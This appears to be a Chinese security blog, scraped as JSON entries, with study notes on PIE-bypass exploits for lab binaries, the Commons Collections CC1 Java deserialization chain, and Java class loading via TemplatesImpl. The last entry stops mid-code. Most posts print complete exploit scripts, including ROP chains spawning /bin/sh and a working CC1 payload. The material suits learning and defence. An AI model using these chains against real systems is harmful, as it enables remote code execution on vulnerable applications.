学习pwn也有很长一段时间了，虽然在栈溢出、格式化字符串漏洞、堆漏洞上都有涉猎，但大多时候程序的保护并没有开启，偶然浏览到一位师傅的博客萌发了学习pie绕过的想法。\n博客地址：https://www.cnblogs.com/Junglezt/p/18253924\n程序链接：pie-bypass\nbypass1 在ida中代码段的地址就已经很说明问题了，这里的地址显示的都只有后三位，这是因为程序开了pie导致的。pie造成的结构可以结合操作系统的分页机制来理解，现代计算机的一页一般是1000字节，程序从磁盘加载到虚拟内存的过程会加上页面的数量，这里讨论linux下的分页机制。\ngdb随便调试一个程序，在vmmap中可以看到分页的偏移量都是1000字节\n对于一个程序的地址有如下公式：\n实际地址 = 原来地址 + n * 1000 （n=0,1,2\u0026hellip;\u0026hellip;）\n依据上面的公式有一个重要结论：程序的最低三位是不会变的。这也是为什么ida中只会显示地址最低三位的值的原因，在攻击中需要覆盖两个字节来修改为后门函数的地址，这两个字节中有四个十六进制数，也就是下面红色标出的，是确定的。还有一个十六进制数有十六种可能，需要进行爆破。\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * context.log_level = \u0026#39;debug\u0026#39; count = 1 while True: p = process(\u0026#34;./pie_bypass1\u0026#34;) try: info(f\u0026#34;-\u0026gt; {count}\u0026#34;) padding = 0x1c payload = b\u0026#39;a\u0026#39; * padding + b\u0026#34;\\xF0\u0026#34; + b\u0026#34;\\xF6\u0026#34; # 假定那一位为F p.sendafter(b\u0026#34;!\\n\u0026#34;, payload) count += 1 recv = p.recv(timeout=10) except: warn(\u0026#34;fail...\u0026#34;) else: p.interactive() break 爆破了21次拿到了shell\nbypass2 函数会输出栈上的一个地址\n临时关闭aslr就会发现该地址值就不会变化了，这是因为aslr的关闭导致的pie失效\n因此可以写一个脚本输出每次的pie偏移量\n1 2 3 4 5 6 7 8 9 10 # 运行在aslr=2的环境下 from pwn import * context.log_level = \u0026#39;debug\u0026#39; p = process(\u0026#34;./pie_bypass2\u0026#34;) no_pie_addr = 0x555555400951 stack_addr = int(p.recv()[1:15], 16) pie_offset = stack_addr - no_pie_addr success(f\u0026#34;pie_offset:{hex(pie_offset)}\u0026#34;) 如果存在后门函数后续就可以先查看没有pie的时候地址加上pie_offset即可\n当然这个程序并没有有效的后门函数，后面的利用基本围绕ROP展开，因此知道整体的偏移比pie_offset更重要\n输出的地址不是没有意义的，rbp+8h为函数的返回地址\n1 2 3 4 5 6 7 8 9 10 11 __int64 message_board() { char buf[48]; // [rsp+0h] [rbp-30h] BYREF void *retaddr; // [rsp+38h] [rbp+8h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(\u0026#34; %#lx what? =_=i \\n\u0026#34;, retaddr); read(0, buf, 0x78uLL); return 0LL; } exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * context.log_level = \u0026#39;debug\u0026#39; p = process(\u0026#34;./pie_bypass2\u0026#34;) elf = ELF(\u0026#34;./pie_bypass2\u0026#34;) ret_addr = int(p.recv()[1:15], 16) # main+14 main_addr = 0x943 offset = ret_addr - 14 - main_addr success(f\u0026#34;offset={hex(offset)}\u0026#34;) def add_offset(addr, offset = offset): return addr + offset padding = 0x38 pop_rdi = 0x9c3 pop_rsi_r15 = 0x9c1 read_addr = 0x740 system_addr = 0x720 buf = 0x202000 - 0x20 ret_addr = 0x288 # ret2csu # read(0,buf,rdx) rdx为任意值可不用设置 payload = padding * b\u0026#39;a\u0026#39; payload += p64(add_offset(ret_addr)) payload += p64(add_offset(pop_rdi)) payload += p64(0) # rdi payload += p64(add_offset(pop_rsi_r15)) payload += p64(add_offset(buf)) # rsi payload += p64(0) # r15 payload += p64(add_offset(read_addr)) payload += p64(add_offset(main_addr)) p.send(payload) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;) # system(buf) payload = b\u0026#39;A\u0026#39; * padding payload += p64(add_offset(ret_addr)) payload += p64(add_offset(pop_rdi)) payload += p64(add_offset(buf)) # rdi payload += p64(add_offset(system_addr)) p.sendafter(b\u0026#34;=_=i \\n\u0026#34;, payload) p.interactive() bypass3 主要利用vsyscall中gadgets进行getshell\nvsyscall主要用于轻量级的系统调用，由于其地址不会变化常用于ROP利用，linux3.5开始vsyscall逐渐被弃用，本地环境内核版本过高无法复现，就不展开说明了\n原文exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import * vsyscall = 0xffffffffff600000 padding = 0x10 + 8 payload = b\u0026#34;A\u0026#34; * padding payload += p64(vsyscall) * 5 payload += b\u0026#34;\\xfc\u0026#34; + b\u0026#34;\\xc2\u0026#34; count = 0 while True: try: count += 1 print(count,end=\u0026#39; \u0026#39;) p = process(\u0026#34;./pie_bypass3\u0026#34;) p.recvuntil(\u0026#34;Leave a message!\\n\u0026#34;) p.send(payload) p.recv(timeout=10) except: print(\u0026#34;error\u0026#34;) else: p.interactive() break ","date":"2024-11-04T15:28:44+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/pie-bypass/","title":"Pie Bypass"},{"content":"CC1 CC链指利用Apache Commons Collections中特定类进行反序列化攻击的链条，该链可在反序列化过程中执行任意代码\n实验环境 JDK 8u65 commons-collections 3.2.1 1 2 3 4 D:\\JAVA\\JDK\\jdk_1.8.0_65\\bin\u0026gt;java -version java version \u0026#34;1.8.0_65\u0026#34; Java(TM) SE Runtime Environment (build 1.8.0_65-b17) Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.zhuwenxiu\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unserialize\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- commons-collections 3.2.1的起步依赖 --\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; 反序列化过程要调试JDK源码，源码文件从openjdk下载，加载到IDE的lib源，调试过程中就可以看到变量名了\nCC链尾命令执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException { // 常规命令执行 Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); // 反射命令执行 Runtime r = Runtime.getRuntime(); // 获取Runtime类 Class c = Runtime.class; // 反射Runtime Method method = c.getMethod(\u0026#34;exec\u0026#34;, String.class); // 通过Runtime.class获取方法exec，封装到Method method.invoke(r,\u0026#34;calc\u0026#34;); // 调用类r的方法exec，这里r是Runtime类，参数是calc // CC反射 new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}).transform(r); } } InvokerTransformer 类在开发中的主要用处是将特定的方法调用应用于一组对象。它将方法调用封装成一个转换器，使得你可以轻松地在处理集合或对象时调用某个方法。\n静态方法transform中封装了反射调用函数的逻辑，调用方法的名称和参数基于InvokerTransformer类的构造方法所传的参数\n只要传的参数合适能够调用任意方法\n链条完善 transform TransformeredMap的方法checkSetValue调用了方法transform，valueTransformer是类的常量，取决于构造方法的参数\n静态方法decorate调用了有参构造方法\ncheckSetValue 子类valueTransformer的setValue调用了父类的方法checkSetValue，这里要对Entry进行遍历调用setValue\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 当前exp手动调用setValue import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class demo { public static void main(String[] args) { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;key\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object,Object\u0026gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()) { entry.setValue(r); // 入口点 } } } setValue 现在要找一个类能够遍历集合的键值对，定位到AnnotationInvocayionHandle.readObject，这正好也是反序列化的入口\nAnnotationInvocationHandler重写方法readObject并调用了setValue，这里没有指定权限则权限为default，AnnotationInvocationHandler只能在本类实例化，需要通过反射在其它类实例化\nmemberValues可控，设为transformedMap进行遍历\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // 有瑕疵的完整反序列化 import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.HashMap; import java.util.Map; public class demo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Runtime r = Runtime.getRuntime(); // Runtime无法序列化 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;key\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object,Object\u0026gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); // for(Map.Entry entry:transformedMap.entrySet()) // { // entry.setValue(r); // 需要传Runtime.getRuntime // } Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class,transformedMap); serialize(obj); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } 当前exp存在两个问题\nRuntime类没有实现Serializable参与反序列化流程，Class类实现了Serializable接口，那么可以使用Runtime.getRuntime().getClass()进行反序列化\nsetValue需要传Runtime.getRuntime()，但是在AnnotationInvocationHandler中setValue的参数已经写死\n绕过AnnotationInvocationHandler的readObject的两个if\nChainedTransformer 从代码的复用性角度来说，应当减少这种复用的工作量，于是使用 ChainedTransformer 这个类\n1 2 3 Method getMethod = (Method) new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}).transform(Runtime.class); Runtime r = (Runtime) new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getMethod); new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}).transform(r); ChainedTransformer的transform可进行上述代码的遍历调用，只需要在构造函数中传一个Transformer数组，数组中都是InvokerTransformer对象即可\n1 2 3 4 5 6 7 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); // transform传最早的Object if绕过 type是AnnotationInvocationHandler构造方法的第一个参数，这里要求所传注解的成员类型不为空，显然Override的成员类型为空，更换为Target\n1 map.put(\u0026#34;key\u0026#34;,\u0026#34;value\u0026#34;); ==\u0026gt; map.put(\u0026#34;value\u0026#34;,\u0026#34;key\u0026#34;); // 保证键的值为value即可 ConstantTransformer 该类的方法transform无论传什么都会返回构造方法所传的对象\n在transformers中添加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 // 完整exp import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class demo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), // 新加 new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;value\u0026#34;,\u0026#34;key\u0026#34;); // 键名改为value Map\u0026lt;Object,Object\u0026gt; transformedMap = TransformedMap.decorate(map,null, chainedTransformer); // invokerTransformer改为chainedTransformer Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Target.class,transformedMap); serialize(obj); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } 总结 命令执行的演化过程 直接调用\n1 Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); 反射调用\n1 2 3 4 5 6 7 8 9 Class c = Runtime.class; // 获取getRuntime() Method method = c.getMethod(\u0026#34;getRuntime\u0026#34;,null); // Runtime实例化 第一个参数传null表示没有任何对象调用改方法，该方法属于类，即静态方法 对应Runtime.getRuntime() Runtime r = (Runtime) method.invoke(null,null); // 获取exec() Method execMethod = c.getMethod(\u0026#34;exec\u0026#34;,String.class); // 调用exec() r相当于Runtime.getRuntime() 这里相当于Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;) execMethod.invoke(r,\u0026#34;calc\u0026#34;); AnnotationInvocationHandler的transform隐式调用\n本质上是封装反射细节\n1 2 3 4 5 6 // 获取getMethod() Method getMethod = (Method) new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}).transform(Runtime.class); // getMethod调用getRuntime() Runtime r = (Runtime) new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getMethod); // Runtime调用exec(\u0026#34;calc\u0026#34;) new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}).transform(r); ChainedTransformer的transform循环调用\n1 2 3 4 5 6 7 8 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); // transform传最早的Object 完整的链条 AnnotationInvocationHandler.readObject \u0026mdash;\u0026gt; memberValue.setValue \u0026mdash;\u0026gt; transformMap.checkSetValue \u0026mdash;\u0026gt; InvokerTransformer.transform\n后续通过调试进一步加深理解\n","date":"2024-10-28T18:11:48+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/cc1/","title":"CC1"},{"content":"JAVA反序列化 入口类的readObject调用危险方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 // Student.java import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serial; import java.io.Serializable; public class Student implements Serializable { @Serial private static final long serialVersionUID = 1L; private int id; private String name; public Student(){} public Student(int id, String name) { this.id = id; this.name = name; } public int getId() { return this.id; } public void setId(int id) { this.id = id; } public String getName() { return this.name; } public void setName(String name) { this.name = name; } @Override public String toString() { System.out.println(\u0026#34;Student ID: \u0026#34; + this.id); System.out.println(\u0026#34;Student Name: \u0026#34; + this.name); return null; } @Serial private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); // 反序列化本质代码，用于执行反序列化的额外操作，这里是命令执行 Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Main.java import java.io.*; public class Main { public static void main(String[] args) throws Exception { //Student demo = new Student(22172080,\u0026#34;zhuwenxiu\u0026#34;); //serialize(demo); System.out.println(unserialize(\u0026#34;ser.bin\u0026#34;)); } public static void serialize(Object obj) throws Exception { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String filePath) throws Exception { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath)); return ois.readObject(); } } 当 ObjectInputStream 反序列化一个对象时，它会检查对象是否实现了 Serializable 接口。如果对象实现了 Serializable 接口，并且类中包含了如下签名的 private 方法\n1 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException; 这里调用了Student.readObject从而弹出计算器\n入口类参数中包含可控类，该类调用危险方法 条件\n入口类和可控类都实现Serializable接口，即都可序列化 入口类重写readObject，可在反序列化添加其他功能 数据类型宽泛，泛型有传对象的可能 jdk、通用框架自带，这样会产生通用的漏洞 可控类调用了常见函数，如通过可控类调用不同类的同一方法 HashMap支持泛型，实现了Serializable接口，重写了readObject方法，又是jdk自带的类，是个能很好满足条件的类\n类加载机制 加载 \u0026ndash;\u0026gt; 连接 \u0026mdash;\u0026gt; 初始化 \u0026mdash;\u0026gt; 实例化 \u0026mdash;\u0026gt; 卸载\n类在初始化和实例化阶段会调用代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // Demo.java public class Demo { private int id; private String name; public Demo() {System.out.println(\u0026#34;无参构造\u0026#34;);} public Demo(int id, String name) { this.id = id; this.name = name; System.out.println(\u0026#34;有参构造\u0026#34;); } @Override public String toString() { return \u0026#34;嗨嗨嗨\u0026#34;; } static { System.out.println(\u0026#34;静态代码块\u0026#34;); } { System.out.println(\u0026#34;示例初始化代码块\u0026#34;); } public static void staticAction() { System.out.println(\u0026#34;调用了静态方法\u0026#34;); } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getId() { return id; } public void setId(int id) { this.id = id; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // Main.java public class Main { public static void main(String[] args) throws Exception { new Demo(); // 1 print(); new Demo(123,\u0026#34;zhuwenxiu\u0026#34;); // 2 print(); Demo.staticAction(); // 3 print(); System.out.println(new Demo()); // 4 } public static void print() { System.out.println(\u0026#34;----------------------\u0026#34;); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 // output 静态代码块 示例初始化代码块 无参构造 ---------------------- 示例初始化代码块 有参构造 ---------------------- 调用了静态方法 ---------------------- 示例初始化代码块 无参构造 嗨嗨嗨 单独调用时有如下输出\n1 2 3 4 // new Demo(); 静态代码块 示例初始化代码块 无参构造 1 2 3 4 // new Demo(123,\u0026#34;zhuwenxiu\u0026#34;); 静态代码块 示例初始化代码块 有参构造 1 2 3 // Demo.staticAction(); // 调用静态方法没有创建对象，不会调用初始化代码 若给静态属性赋值只会输出 静态代码块 静态代码块 调用了静态方法 1 2 3 4 5 // System.out.println(new Demo()); 静态代码块 示例初始化代码块 无参构造 嗨嗨嗨 类在加载为对象的时候会调用静态代码块和初始化代码块（初始化代码总是在构造方法之前）\nClass.forName可通过参数指定是否初始化来决定是否执行初始化代码块\n类加载流程 loadClass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // java.lang.ClassLoader protected Class\u0026lt;?\u0026gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // 检查类是否已经加载 Class\u0026lt;?\u0026gt; c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { // 根据双亲委派模型将类加载请求委派给父类加载器 if (parent != null) { c = parent.loadClass(name, false); } else { // 父类加载器为空，委托给BootStrap加载器加载 c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // 如果未找到该类，则抛出 ClassNotFoundException } // 自定义加载方法，这里是通过调用findClass if (c == null) { // 如果仍然没有找到，则调用 findClass 来查找该类 // findClass需要重写 long t1 = System.nanoTime(); c = findClass(name); // 这是定义类加载器；记录统计数据 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { // 调用resolveClass解析类，将符号引用转换为直接引用 resolveClass(c); } return c; } } findClass 1 2 3 4 // java.lang.ClassLoader protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } ClassLoader.findClass并没有具体的实现，一般这个方法都是要重写的，定位到某个子类的具体实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // java.net.URLClassLoader // URLClassLoader继承于SecureClassLoader，SecureClassLoader继承于ClassLoader，这里重写了findClass方法 protected Class\u0026lt;?\u0026gt; findClass(final String name) throws ClassNotFoundException { final Class\u0026lt;?\u0026gt; result; try { result = AccessController.doPrivileged( new PrivilegedExceptionAction\u0026lt;Class\u0026lt;?\u0026gt;\u0026gt;() { // 实现 PrivilegedExceptionAction 接口的 run 方法 public Class\u0026lt;?\u0026gt; run() throws ClassNotFoundException { // 将class文件路径的.替换为/变成完整的文件路径 String path = name.replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;); // 使用ucp获取文件资源 Resource res = ucp.getResource(path, false); if (res != null) { try { // 存在该class文件用defineClass加载 return defineClass(name, res); } catch (IOException e) { throw new ClassNotFoundException(name, e); } } else { // 找不到class文件返回空 return null; } } }, acc); } catch (java.security.PrivilegedActionException pae) { throw (ClassNotFoundException) pae.getException(); } if (result == null) { throw new ClassNotFoundException(name); } // 返回加载后的类对象 return result; } findClass可以简单理解为先进行一系列的判断，然后调用的defineClass，下面看defineClass的实现\ndefineClass 1 2 3 4 5 6 7 8 9 10 11 12 // java.lang.ClassLoader protected final Class\u0026lt;?\u0026gt; defineClass(String name, byte[] b, int off, int len, ProtectionDomain protectionDomain) throws ClassFormatError { protectionDomain = preDefineClass(name, protectionDomain); String source = defineClassSourceLocation(protectionDomain); // 调用native标识的defineClass1，具体的细节是在C/C++中实现的，源码的查看部分也就到此为止 Class\u0026lt;?\u0026gt; c = defineClass1(name, b, off, len, protectionDomain, source); postDefineClass(c, protectionDomain); return c; } 阅读文档可知defienClass可将字节数组转化为Class对象，defineClass是类加载的核心操作\n总结 类加载一般情况下函数流程的后面都是loadClass \u0026mdash;\u0026gt; findClass \u0026mdash;\u0026gt; defineClasss，前面可能就是各种往上抛的父类；后面也有可能是loadClass \u0026mdash;\u0026gt; defineClass跳过findClass，某些加载器是会这么实现的。不管怎么说类加载的实质就是defineClass，后面想要加载动态类只要看是否有调用defineClass即可。\n类加载的两种途径\nClassLoader.defineClass Unsafe.defineClass 加载class文件 Class.forName 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Test_.java package demo; import java.io.IOException; public class Test_ { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } } 初始化类执行了静态代码块\nClass.forName的实现中调用了Class.forName0，第二个参数传true默认默认进行类的初始化，所以会执行静态代码块\n1 2 3 4 5 6 7 8 9 10 11 package demo; public class LoadCLass { public static void main(String[] args) throws ClassNotFoundException { //Class.forName(\u0026#34;demo.Test_\u0026#34;); ClassLoader classLoader = ClassLoader.getSystemClassLoader(); System.out.println(classLoader); // 系统类加载器 System.out.println(LoadCLass.class.getClassLoader()); // 本类加载器 Class.forName(\u0026#34;demo.Test_\u0026#34;,false,classLoader); } } 1 2 sun.misc.Launcher$AppClassLoader@14dad5dc sun.misc.Launcher$AppClassLoader@14dad5dc 第二个参数设为false不会进行类初始化，因此不会执行静态代码块，系统类和本类使用的都是同一个加载器AppClassLoader\nClassLoader.defineClass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package demo; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class LoadCLass { public static void main(String[] args) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException { // 反射调用ClassLoader.defineClass() ClassLoader systemClassLoader= ClassLoader.getSystemClassLoader(); Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); // 读取class字节码文件 byte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;Test.class\u0026#34;)); // 加载类，调用defineClass Class defineClass = (Class) defineClassMethod.invoke(systemClassLoader,\u0026#34;Test\u0026#34;,bytes,0,bytes.length); // 初始化类 defineClass.newInstance(); } } 主要步骤\n获取默认加载器 读取字节码文件 调用ClassLoader.defineClass TemplatesImpl TemplatesImpl的内部类TransletClassLoader的方法defineClass封装了ClassLoader.defineClass\nTemplatesImpl.defineTransletClasses调用了defineClass\nTemplatesImpl.getTransletInstance调用了defineTransletClasses\nTemplatesImpl.newTransformer构造方法TransformerImpl调用了getTransletInstance，权限是public，可作为入口\n在TemplatesImpl.getOutputProperties中调用newTransformer，这里的权限是public，也可作为的入口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package demo; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.TransformerConfigurationException; import java.io.IOException; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class TemplatesImplTest { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException { TemplatesImpl templatesImpl = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;Test.class\u0026#34;)); // 通过反射绕过一些if判断 setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytes}); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;test\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); // 